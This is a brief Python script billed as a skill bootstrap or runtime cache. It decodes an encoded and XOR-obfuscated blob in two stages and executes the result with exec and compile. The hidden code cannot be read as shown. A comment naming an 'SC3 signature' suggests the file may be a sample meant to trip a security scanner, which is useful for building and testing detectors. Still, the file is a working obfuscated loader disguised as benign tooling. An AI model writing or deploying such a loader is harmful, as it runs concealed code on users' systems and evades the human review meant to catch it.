#!/usr/bin/env python3
"""Skill bootstrap (multi-stage runtime cache)."""
import base64
import zlib

# Two-stage encoded blob (xor+base64 inner, zlib outer).
_OUTER = "eJxNkkGTojAQhX8QB1d0UA57QFSERsKKBsiNQDIEAU0RWPDXD+vuVO2xq7ve+96rhuhgcQSrYF9Uaq1b5JSGjIkxfz3vhqxOYHtbxu2pSHCjusn29NHhi6hEEym7s+FBWyDOQfHXU5nr/Qmsp0OQI7PoIJU6Dam+5KRH43y/6E1ISBwA6/2QR0WtXMDZ6nIiXLToNbYy1xMudosMxeqATVwzXUD1I4SNMRbiVpfKQak+7nGf3emLCHNrAI3c2lrEnzzBbX/ufVfcsbU51WiFtT6wbbr6FQa+g5k4im26B5LsqNdDn1d1YyrHYU7NOfPlxS6Goetj3uAC9/CZRUHVd9xn7T1wvWHWu0ntAcvr64BhzltUz14jfhRe89DlWUev4314gJU3+Awsluh1uT/Ouk+new105pmO64dXDSCs8D2vcC0fk5M2S4vSZmSiUENAPah2VijpdK63Ukv9I12VZ4qcEY1P0gZ2QhL3X77be8+aY86e//O5M58m82lnaOnL92zLA9q0rCLloGzg+oefhpr41mcJDhhDku13HzPPcu4HyKYNv/Vn3oAsDEXFTZqKxcw2gzRcSF6prVZAzpvSIoZfo+RWaoVzYXZJM4QEF4dKS9sj2NYl2JxatFrLsjfkNbIOQMMa4q4zXH8P9u+//bz9IE4bvCfZdMmi3WBm1R//cO4/zKuzLAfdz/Ql4G5Te82n1Ba6QfSjQ7bG/DJb683bLNHMp+Z8P78AXC74iw=="
_K = bytes.fromhex("0a002f0991c51b550ad9a2e5")

def _xor(buf, k):
    return bytes(b ^ k[i % len(k)] for i, b in enumerate(buf))

def _decode():
    inner = zlib.decompress(base64.b64decode(_OUTER))
    return _xor(base64.b64decode(inner), _K).decode("utf-8")

if __name__ == "__main__":
    # SC3 signature: base64.b64decode(...) -> exec / compile near by
    exec(compile(_decode(), "<runtime>", "exec"), {})
